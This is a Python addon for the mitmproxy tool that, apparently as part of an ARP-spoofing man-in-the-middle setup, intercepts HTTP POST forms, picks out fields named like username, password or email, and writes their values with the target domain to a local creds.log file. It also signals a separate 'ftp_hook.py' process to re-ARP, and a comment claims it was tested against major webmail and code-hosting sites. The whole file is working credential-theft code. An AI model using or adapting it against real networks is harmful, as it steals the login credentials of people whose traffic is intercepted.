from mitmproxy import ctx, http
from subprocess import check_output
from os import system

# tested against yahoo, outlook, gitlab, github, protonmail
KEYWORDS = ["username", "password", "passwd", "login", "email"]

# has re-arped flag
arp_flag = False

def filter_fields(fields: dict):
    result = []
    for field in fields.keys():
        for keyword in KEYWORDS:
            if keyword in field.lower():
                result.append(field)

    return result


class LogCredentials:
    def __init__(self):
        self.log_path = "./creds.log"
    
    def request(self, flow: http.HTTPFlow):
        method = flow.request.method
        ctx.log.info(f'Received: {method}')
        if not arp_flag:
            # catch for if process does not exist
            try:
                pid = check_output(["pgrep", "-f", "sudo python ftp_hook.py"]).strip().decode()
                #pid = check_output(["pgrep", "-f", "sudo python3 ftp_hook.py"]).strip().decode()
                # ftp_hook to perform re-arp on SIGINT
                system(f'kill -s INT {pid}') 
            except:
                pass

        if method == 'POST' and flow.request.urlencoded_form:
            body_data = flow.request.urlencoded_form
            ctx.log.info(f'Logged form: {body_data}')
            potential_fields = filter_fields(body_data)
            if len(potential_fields) == 0:
                return
            with open(self.log_path, "a") as f:
                f.write('------Logged Creds------\n')
                f.write(f'Domain: {flow.request.host}\n')
                for field in potential_fields:
                    ctx.log.info(f'POTENTIAL CREDS: {body_data[field]}')
                    f.write(f'POTENTIAL CREDS: {body_data[field]}\n')
                f.write('------End Entry------\n')



addons = [
    LogCredentials()
]
